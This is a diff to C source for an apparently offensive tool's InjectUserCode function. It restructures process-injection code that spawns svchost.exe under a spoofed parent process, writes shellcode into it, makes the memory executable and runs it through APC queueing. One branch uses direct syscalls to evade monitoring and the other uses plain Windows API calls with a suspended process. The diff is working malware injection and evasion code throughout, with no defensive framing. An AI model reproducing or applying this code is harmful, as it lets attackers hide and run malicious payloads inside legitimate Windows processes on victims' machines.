@@ -177,8 +177,6 @@ BOOL InjectUserCode(CHAR* Bytes, SIZE_T Size)
     SIZE_T tSize = 0;
     ULONG oProc, nProc;
 
-    LPVOID rBuffer = NULL;
-
     HANDLE g_hChildStd_IN_Rd = NULL;
     HANDLE g_hChildStd_IN_Wr = NULL;
     HANDLE g_hChildStd_OUT_Rd = NULL;
@@ -260,31 +258,60 @@ BOOL InjectUserCode(CHAR* Bytes, SIZE_T Size)
         UpdateProcThreadAttribute(sInfo.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &policy, sizeof(policy), NULL, NULL);
     #endif
 
-    // spawn svchost.exe with a different ppid an jus start it running
-    CreateProcessA("C:\\Windows\\system32\\svchost.exe", NULL, NULL, NULL, TRUE, EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &sInfo, &pInfo);
+    // use syscalls if we are in secure mode
+    #ifdef SECURE
+        DEBUG("doing secure exec");
 
-    // alloc the memory we need inside the process
-    rBuffer = VirtualAllocEx(pInfo.hProcess, NULL, Size, (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);
-    
-    // make sure we are using the correct syscall numbers, probly a nicer way of doing this
-    if ((osInfo.dwMajorVersion) == 10 && (osInfo.dwMinorVersion == 0))
-    {
-        NtQueueApcThread     = &NtQueueApcThread10;
-        NtWriteVirtualMemory = &NtWriteVirtualMemory10;
-    } else if ((osInfo.dwMajorVersion) == 6 && (osInfo.dwMinorVersion == 3))
-    {
-        NtQueueApcThread     = &NtQueueApcThread81;
-        NtWriteVirtualMemory = &NtWriteVirtualMemory81;
-    }
+        // TODO: spawn svchost.exe with a different ppid an jus start it running
+        CreateProcessA("C:\\Windows\\system32\\svchost.exe", NULL, NULL, NULL, TRUE, EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &sInfo, &pInfo);
 
-    // write our shellcode bytes to the process
-    NtWriteVirtualMemory(pInfo.hProcess, rBuffer, Bytes, Size, NULL);
 
-    // change the permisions on the memory so we can execute it
-    VirtualProtectEx(pInfo.hProcess, rBuffer, Size, PAGE_EXECUTE_READWRITE, &oProc);
+        LPVOID rBuffer = NULL;
 
-    // execute the code inside the process
-    NtQueueApcThread(pInfo.hThread, (PIO_APC_ROUTINE)rBuffer, NULL, NULL, NULL);
+        // alloc the memory we need inside the process, TODO: syscall
+        rBuffer = VirtualAllocEx(pInfo.hProcess, NULL, Size, (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);
+
+        // make sure we are using the correct syscall numbers, probly a nicer way of doing this
+        if ((osInfo.dwMajorVersion) == 10 && (osInfo.dwMinorVersion == 0))
+        {
+            NtQueueApcThread     = &NtQueueApcThread10;
+            NtWriteVirtualMemory = &NtWriteVirtualMemory10;
+        } else if ((osInfo.dwMajorVersion) == 6 && (osInfo.dwMinorVersion == 3))
+        {
+            NtQueueApcThread     = &NtQueueApcThread81;
+            NtWriteVirtualMemory = &NtWriteVirtualMemory81;
+        }
+
+        // write our shellcode bytes to the process
+        NtWriteVirtualMemory(pInfo.hProcess, rBuffer, Bytes, Size, NULL);
+
+        // change the permisions on the memory so we can execute it, TODO: syscall
+        VirtualProtectEx(pInfo.hProcess, rBuffer, Size, PAGE_EXECUTE_READWRITE, &oProc);
+
+        // execute the code inside the process
+        NtQueueApcThread(pInfo.hThread, (PIO_APC_ROUTINE)rBuffer, NULL, NULL, NULL);
+    #endif
+
+    // use straight api calls if we are not in secure mode
+    #ifndef SECURE
+        DEBUG("doing insecure exec");
+
+        LPVOID rBuffer;
+
+        // create a suspended svchost
+        CreateProcessA("C:\\Windows\\system32\\svchost.exe", NULL, NULL, NULL, TRUE, CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &sInfo, &pInfo);
+
+        // alloc + write bytes + queue
+        rBuffer = (LPVOID)VirtualAllocEx(pInfo.hProcess, NULL, Size, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+        WriteProcessMemory(pInfo.hProcess, rBuffer, (LPVOID)Bytes, Size, NULL);
+        QueueUserAPC((PAPCFUNC)rBuffer, pInfo.hThread, NULL);
+
+        // start the thread
+        ResumeThread(pInfo.hThread);
+        CloseHandle(pInfo.hThread);
+        
+
+    #endif
 
     // clean up a bit
     ZeroMemory(Bytes, Size);
